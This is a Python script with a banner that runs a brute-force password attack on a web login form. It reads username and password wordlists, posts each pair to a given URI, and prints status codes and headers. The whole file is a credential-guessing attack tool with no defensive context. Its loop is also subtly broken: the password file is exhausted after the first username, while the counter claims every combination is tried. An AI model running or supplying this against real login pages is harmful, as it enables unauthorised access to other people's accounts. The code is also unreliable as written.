import requests
import argparse

print(" ______ ______ _______ _______ _______ _______ _______")
print("|   __ \\   __ \\   |   |_     _|_     _|     __|   |   |")
print("|   __ <      <   |   | |   |  _|   |_|__     |       |")
print("|______/___|__|_______| |___| |_______|_______|___|___|")

parser = argparse.ArgumentParser()
parser.add_argument("userlist", help="Userlist to be used")
parser.add_argument("passlist", help="Passlist to be used")
parser.add_argument("URI", help="URI against which brute force attack should be run")
args = parser.parse_args()

userlist = args.userlist
passlist = args.passlist
uri = args.URI

USER = open(userlist, "r")
PASS = open(passlist, "r")
print(USER)
print(PASS)

x = 1
uc = 0
pc = 0
with open(userlist, "r") as ul:
        for line in ul:
                if line.strip():
                        uc+=1
with open(passlist, "r") as pl:
        for line in pl:
                if line.strip():
                        pc+=1

print('Brute-Force in progress...\n')
for i in USER:
        i = i.strip()
        for j in PASS:
                j = j.strip()
                session = requests.Session()
                try:
                        page = session.get(uri)
                        response = session.post(
                                uri,
                                data = {"username":i, "password":j},
                        )
                        print(f'Status: {response.status_code}')
                        print(f'Headers: {response.headers}')
                        #print(f'Body: {response.body}')
                except Exception as e:
                        print(f'Exception occured: {e}')
                print(f'{x}/{uc*pc} combination tried')
                print('-'*70)
                x+=1
session.close()
